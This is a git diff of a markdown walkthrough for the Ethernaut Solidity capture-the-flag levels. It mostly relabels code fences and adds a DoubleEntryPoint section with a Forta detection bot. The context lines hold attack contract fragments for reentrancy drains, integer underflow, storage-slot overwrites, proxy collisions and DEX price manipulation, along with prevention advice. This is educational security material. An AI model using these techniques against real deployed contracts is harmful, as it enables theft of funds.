@@ -75,14 +75,14 @@ While this example may be simple, confusing tx.origin with msg.sender can lead t
 An example of a possible attack is outlined below.
 
 Use tx.origin to determine whose tokens to transfer, e.g.
-```js
+```solidity
 function transfer(address _to, uint _value) {
   tokens[tx.origin] -= _value;
   tokens[_to] += _value;
 }
 ```
 Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
-```js
+```solidity
 function () payable {
   token.transfer(attackerAddress, 10000);
 }
@@ -98,7 +98,7 @@ Success condition:
 We need to acquire some token. We can see that the contract uses solidity version 0.6.0 and do not use SafeMath. Version of solidity older than 0.8.0 are vulnerable to uint overflow. We need to abuse this vulnerability to change the balances mapping.
 
 If we transfer an amount of 21 token `balances[msg.sender] - _value >= 0` will be true and `balances[msg.sender] -= _value` will actually increase our balance. uint256 have a range of [0, 2^256-1]. since we have 20 token in our account we choose _value to be equla to 21 resulting in:
-```js
+```solidity
 balances[msg.sender] - _value // 20 - 21 = 2^256 -1
 ```
 The uint245 will underflow and give us a huge number for our new balance.
@@ -119,14 +119,14 @@ Since 0.8.0, Solidity check for overflow by default and throw an error if one oc
 ## Level completed!
 
 Overflows are very common in solidity and must be checked for with control statements such as:
-```js
+```solidity
 if(a + c > a) {
   a = a + c;
 }
 ```
 An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:
 
-```js
+```solidity
 a = a.add(c);
 ```
 If there is an overflow, the code will revert.
@@ -257,7 +257,7 @@ Success condition:
 
 We need to block the level from taking back kingship of the instance. Once we submit the instance it will call the receive fct:
 
-```js
+```solidity
 require(msg.value >= prize || msg.sender == owner);
 king.transfer(msg.value);
 king = msg.sender;  // becomes the new king
@@ -278,7 +278,7 @@ Simply enough. Based on the Name of the level, we will have to use a re-entrancy
 
 Our `receive()` function is like this:
 
-```js
+```solidity
 receive() external payable {
     uint256 balanceTotal = victim.balance; // find out how much ether is in the contract
     if (balanceTotal > 0) {
@@ -291,7 +291,7 @@ receive() external payable {
 
 By looking at the `withdraw()` function we can see that we need to satisfy this condition `(balances[msg.sender] >= _amount)` to execute the `msg.sender.call()`. So we first need to donate some ether to increase our balance in the contract. By sending the same amount of ether that is on the contract, We will be able to drain all funds by calling the `withdraw()` function:
 
-```js
+```solidity
 function attack() public {
     uint256 balanceTotal = victim.balance;  //get the amount of ether on the contract
     Reentrance(victim).donate{value: balanceTotal, gas: 1000000}( //send that much ether.  (need to add more gaz)
@@ -302,7 +302,7 @@ function attack() public {
 
 ```
 Here's what happens during our attack in the Reentrance::withdraw function:
-```js
+```solidity
    function withdraw(uint256 _amount) public {
         if (balances[msg.sender] >= _amount) {  // 1. condition passed since withdraw what we sent
             (bool result, ) = msg.sender.call{value: _amount}("");  // 2. we get our money back plus run our receive() function which run 1. and 2. again
@@ -327,7 +327,7 @@ A contract during its normal execution may perform calls to other contracts, by 
 
 ### How to prevent the attack
 To avoid a Re-entrancy attack, it is good to use a Check-effect-interaction pattern, where you first reduce the balance of the user before sending him his money for exemple. You can also use a lock on the function such as a locking modifier:
-```js
+```solidity
 modifier lock() {
         locked = true;
         _;
@@ -336,7 +336,7 @@ modifier lock() {
 ```
 
 ### call() instead of transfer and send
-```js
+```solidity
 contract Vulnerable {
     function withdraw(uint256 amount) external {
         // This forwards 2300 gas, which may not be enough if the recipient
@@ -377,7 +377,7 @@ Succes condition:
 
 We just need to set the `top` variable to `true`. The function `goTo()` can do that:
 
-```js
+```solidity
 function goTo(uint256 _floor) public {
     Building building = Building(msg.sender);  //our contract need to be a Building
 
@@ -389,7 +389,7 @@ function goTo(uint256 _floor) public {
 ```
 So we just need to create a contract with a `isLastFloor(uint256)` function that return `false` the first time it is called and `true` the second time. This easily do the trick:
 
-```js
+```solidity
 function isLastFloor(uint256 _floor) external returns (bool) {
     bool ret = top;
     top = !top;
@@ -468,7 +468,7 @@ We create an attack contract: `AttackGatekeeperOne.sol`.
 
 We need to play with the amount of gas. Instead of trying to calculate exactly how much gas we had spent until this point I decided to brute force it.
 
-```js
+```solidity
 for (uint256 i = 0; i < 8191; i++) {  // loop 
             (bool result, ) = victim.call{gas: 24000 + i}(  // modify the gas by one
                 abi.encodeWithSignature(("enter(bytes8)"), key)  // call the fct enter with our key
@@ -522,7 +522,7 @@ Similar to the last level we need to pass three gates. The first one is the same
 We create an attack contract: `AttackGatekeeperOne.sol`.
 
 ### Gate Two
-```js
+```solidity
 uint256 x;
         assembly {
             x := extcodesize(caller())
@@ -539,7 +539,7 @@ CODESIZE should return the length of the initialization code.
 
 ### Gate Three
 
-```js
+```solidity
 require(
         uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
             uint64(_gateKey) ==
@@ -589,7 +589,7 @@ The goal of this level is for you to claim ownership of the instance you are giv
 
 We can see there is no function that can change the owner variable so we will have to find another way. The contract uses a library and two function call this library with `delegatecall()`. By looking at the library, we can see that it has a function to change its first variable. This means we can use the delegate call to change the first variable of our victim contract which happens to be the address of the library. We will change it to our attack contract. Once we change that address, we will be able to tell the contract to call a function in our attack contract, with delegatecall, which we will use to change the owner variable.
 
-```js
+```solidity
 function attack() public {
     Preservation(victim).setFirstTime(uint256(address(this)));  // we first change the address of lib1 in our victim contract
 
@@ -764,13 +764,13 @@ Success condition:
 Once again, we need to claim ownership of a contract by changing the `owner` variable. Since our contract inherit `Ownable`, it will have an owner variable. This variable will be store in slot 0. AlienCodex variables are then store, since and address and a bool can share a 32 bytes slot, there are packed together so we end up with owner and bool in slot 0, followed by the dynamic array variable. the first available slot store the length of the dynamic array. The value of the array are store at address = keccak256(slot#) + (index * elementSize) => keccak256(1) + i.
 
 Now let's talk about the vulnerability:
-```js
+```solidity
 function retract() public contacted {
     codex.length--;
 }
 ```
 This function reduce the length of the array by 1. After initialization of the contract, the length is zero so calling this function will cause an underflow and set a new length of 2^256. This is the maximum amount of storage slot available to a contract and since the element of the array are of 32 bytes length, we can now access any slot of our contract storage and modify it with this function:
-```js
+```solidity
 function revise(uint256 i, bytes32 _content) public contacted {
     codex[i] = _content;
 }
@@ -785,7 +785,7 @@ at slot 0 will be stored codex[2^256 -1 -keccak(1) +1]
 So for i = 2^256 - keccak(1), and _content = our address, the `revise()` function will give us ownership of the contract. 
 
 We can solve this level with a simple contract that will call the first two functions and then calculate the value of i we want to modify the owner variable:
-```js
+```solidity
 function attack() public {
         AlienCodex(victim).make_contact();  // to pass the contacted modifier
         AlienCodex(victim).retract();  // create the underflow
@@ -881,13 +881,13 @@ You will start with 10 tokens of token1 and 10 of token2. The DEX contract start
 You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
 
 We can see by looking at the Dex contract, and more precisely at `getSwapPrice()` function that we can exploit the way the swap amount is calculated. The dex start with supply of 100 for each token, and we start with 10 and 10. If we first swap 10 of token1, we will receive 10 of token2. We now have 0-20, But then dex has 110-90. Now when we swap our 20 of token2, the dex will send us (20 * 110 / 90) = 24, according to the `getSwapPrice()` function:
-```js
+```solidity
 return ((amount * IERC20(to).balanceOf(address(this))) /
     IERC20(from).balanceOf(address(this)));
 ```
 
 Our next swap we give us 24 * 110 / 86 = 30 of token1. As we can see, we can use the low liquidity of the pool to manipulate the price of the two token. As a token supply decrease compare to the other one (in the pool) its value increase, so when we go for a swap we get more of the second token. If we keep going, we get 41 of token1 and finally 65 of token2. Now we are at 0-65, the dex is at 110-45. If we tried to swap our 65 token we should receive 65*100/45 = 158 and since the dex doesn't have enough, the transaction revert here: `IERC20(to).transferFrom(address(this), msg.sender, swapAmount);` We need to calculate how many token to swap to completly emtpy the supply of the other token:
-```js
+```solidity
 uint256 amount = dex.balanceOf(from, address(this));
 uint256 amountReceived = dex.getSwapPrice(from, to, amount);
 if (amountReceived > 110) {
@@ -914,7 +914,7 @@ Uniswap TWAP Oracles relies on a time weighted price model called TWAP. While th
 
 Here is an example of getting data from a Chainlink data feed (on the kovan testnet):
 
-```js
+```solidity
 pragma solidity ^0.6.7;
 import "@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol";
 
@@ -958,7 +958,7 @@ This level is similar to the previous one, but we can see that the swap function
 
 We will create a new ERC20 token and swap our own newly make token for the two token present on the dex, we just need to figured out how much to swap to get the entire supply of token 1and 2. If we look at `getSwapAmount()`:
 
-```js
+```solidity
 function getSwapAmount(
         address from,
         address to,
@@ -1004,7 +1004,7 @@ You'll need to hijack this wallet to become the admin of the proxy.
 
 Here we need to become admin of the PuzzleProxy contract by changing the `admin` variable. No function allow us to change this without already being the admin. Since the contract use a Proxy pattern, the proxy contract and the implementation contract share their storage, so changing the variable in one of the contract will also change the variable in the corresponding slot in the other contract.We can see in the PuzzleWallet contract that the `maxBalance` variable is in the same slot (slot #1) as `admin` in the PuzzleProxy contract and the method `setMaxBalance()` allow us to change it:
 
-```js
+```solidity
 function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { // condition #1 need to be whitlisted
     require(address(this).balance == 0, "Contract balance is not 0");  // condition #2 contract balance need to be zero
     maxBalance = _maxBalance;
@@ -1013,7 +1013,7 @@ function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { // condit
 
 There is two condition that must be fullfiled for us to use this method.
 First we must be whitelisted. To add ourselves in the whitelisted list we need to use the `addToWhitelist()` function:
-```js
+```solidity
 function addToWhitelist(address addr) external {
     require(msg.sender == owner, "Not the owner");
     whitelisted[addr] = true;
@@ -1021,7 +1021,7 @@ function addToWhitelist(address addr) external {
 ```
 
 To use that function we need to be owner of the PuzzleWallet contract. We can see that `owner` and `pendingAdmin` share the same slot (slot #0) and we can easily change the `pendingAdmin` variable with the `proposeNewAdmin()` function:
-```js
+```solidity
 function proposeNewAdmin(address _newAdmin) external {
     pendingAdmin = _newAdmin;
 }
@@ -1031,7 +1031,7 @@ Changing the `pendingAdmin` variable in the proxy will change the `owner` variab
 
 Now for the second condition, we need to reduce the balance of the contract to zero :`require(address(this).balance == 0, "Contract balance is not 0");`.
 `execute()` is the only method that can spend contract funds, but we can only spend the funds we have in our balances and the contract already has a balance that we can not access. We need to find a way to make the contract believe that we have a higher balance than what we have deposited on the contract. We will use the `multicall()` function for that:
-```js
+```solidity
 function multicall(bytes[] calldata data) external payable onlyWhitelisted {
     bool depositCalled = false;
     for (uint256 i = 0; i < data.length; i++) {
@@ -1062,7 +1062,7 @@ multicall_deposit_calldata = instance.multicall.encode_input([deposit_hash]) # h
 data = [deposit_hash, multicall_deposit_calldata]  # we can now packed those two calldata together to have the final argument to give to multicall
 ```
 In Solidity:
-```js
+```solidity
 bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
 bytes[] memory deposit_sig_in_array = new bytes[](1);
 deposit_sig_in_array[0] = deposit_sig;
@@ -1084,7 +1084,7 @@ We then call `multicall()`, providing the calldata we just created and the value
 instance.multicall(data, {"from": account, "value": wallet_balance})  # python
 ```
 or
-```js
+```solidity
 wallet.multicall{value: address(this).balance}(data); // solidity
 ```
 
@@ -1133,7 +1133,7 @@ We have a proxy pattern with the Engine contract acting as the logic (or impleme
 We need to make the Motorbike contract unusable. We can see that the Motorbike contract only holds the code to delegate to the implementation and the code to upgrade the implementation is in the Engine contract. This is often done that way to optimize gas cost, you want the proxy to be as small as possible since you will deploy many proxies and the implementation only once, so it can be bigger. But this means that if we can destruct the Engine contract, the Motorbike proxy will become completely unusable, and it will not be possible to change its implementation to a new one.
 
 We are going to call `upgradeToAndCall()` to change the implementation to a new address:
-```js
+```solidity
 function upgradeToAndCall(address newImplementation, bytes memory data)
         external
         payable
@@ -1178,3 +1178,118 @@ Takeways: never leaves implementation contracts uninitialized ;)
 
 If you're interested in what happened, read more [here](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).
 
+
+# 26) DoubleEntryPoint
+
+Success condition:
+> This level features a CryptoVault with special functionality, the sweepToken function. This is a common function to retrieve tokens stuck in a contract. The CryptoVault operates with an underlying token that can't be swept, being it an important core's logic component of the CryptoVault, any other token can be swept.  
+The underlying token is an instance of the DET token implemented in DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.  
+In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.  
+The contract features a Forta contract where any user can register its own detection bot contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a detection bot and register it in the Forta contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.
+
+There is two steps in this level, first we must find a vulnerability to sweep the DET form the vault, and second we need to deploy a forta detection bot to detect a transaction which uses this vulnerability.
+
+## The vunerability
+
+If we try to directly sweep the token with the `sweepToken()` function:
+```solidity
+function sweepToken(IERC20 token) public {
+    require(token != underlying, "Can't transfer underlying token");
+    token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
+}
+```
+It will revert since the DET is the underlying token. But if we call `sweepToken()` with the legacy token as argument, we will arrive at the second line which will call:
+```solidity
+function transfer(address to, uint256 value)
+    public
+    override
+    returns (bool)
+{
+    if (address(delegate) == address(0)) {
+        return super.transfer(to, value);
+    } else {
+        return delegate.delegateTransfer(to, value, msg.sender);
+    }
+}
+```
+This in turn will call:
+```solidity
+function delegateTransfer(
+    address to,
+    uint256 value,
+    address origSender
+) public override onlyDelegateFrom fortaNotify returns (bool) {
+    _transfer(origSender, to, value);
+    return true;
+}
+```
+which will transfer the DET to our account. 
+
+## The Bot
+
+But we can see that one of the modifier is `fortaNotify`:
+```solidity
+modifier fortaNotify() {
+        address detectionBot = address(forta.usersDetectionBots(player));
+
+        // Cache old number of bot alerts
+        uint256 previousValue = forta.botRaisedAlerts(detectionBot);
+
+        // Notify Forta
+        forta.notify(player, msg.data);
+
+        // Continue execution
+        _;
+
+        // Check if alarms have been raised
+        if (forta.botRaisedAlerts(detectionBot) > previousValue)
+            revert("Alert has been triggered, reverting");
+    }
+```
+This will check how many alerts have been raised by a given bot, notify the bot of a coming call, run the `delegateTransfer()` function and after that, check to see if an alert was raised during the `delegateTransfer()` function. If its the case, it will revert the transaction.
+
+`forta.notify()`:
+```solidity
+function notify(address user, bytes calldata msgData) external override {
+    if (address(usersDetectionBots[user]) == address(0)) return;
+    try usersDetectionBots[user].handleTransaction(user, msgData) {
+        return;
+    } catch {}
+}
+```
+will actually call our bot using a `handleTransaction()` function and passing it the msg.data of `delegateTransfer()`. Since the exploit appear when we try to use the `delegateTransfer()` function, we can simply check the [function signature of msgData](https://ethereum.stackexchange.com/questions/61826/how-to-extract-function-signature-from-msg-data) to see if its `delegateTransfer()` and raise an alert if its the case. 
+  
+
+
+
+
+---
+### Double Entry Point Token
+[TrueUSD ↔ Compound Vulnerability](https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2)  
+[Balancer](https://forum.balancer.fi/t/medium-severity-bug-found/3161)  
+
+### Misc
+[Forta](https://docs.forta.network/en/latest/)  
+[Extract signature from msg.data](https://ethereum.stackexchange.com/questions/61826/how-to-extract-function-signature-from-msg-data)
+
+
+---
+## Level completed!
+
+Congratulations!
+
+This is the first experience you have with a Forta bot.
+
+Forta comprises a decentralized network of independent node operators who scan all transactions and block-by-block state changes for outlier transactions and threats. When an issue is detected, node operators send alerts to subscribers of potential risks, which enables them to take action.
+
+The presented example is just for educational purpose since Forta bot is not modeled into smart contracts. In Forta, a bot is a code script to detect specific conditions or events, but when an alert is emitted it does not trigger automatic actions - at least not yet. In this level, the bot's alert effectively trigger a revert in the transaction, deviating from the intended Forta's bot design.
+
+Detection bots heavily depends on contract's final implementations and some might be upgradeable and break bot's integrations, but to mitigate that you can even create a specific bot to look for contract upgrades and react to it. Learn how to do it here.
+
+You have also passed through a recent security issue that has been uncovered during OpenZeppelin's latest [collaboration with Compound protocol](https://compound.finance/governance/proposals/76).
+
+Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened [here](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/).
+
+--------
+
+## This was the last Ethernaut challenge
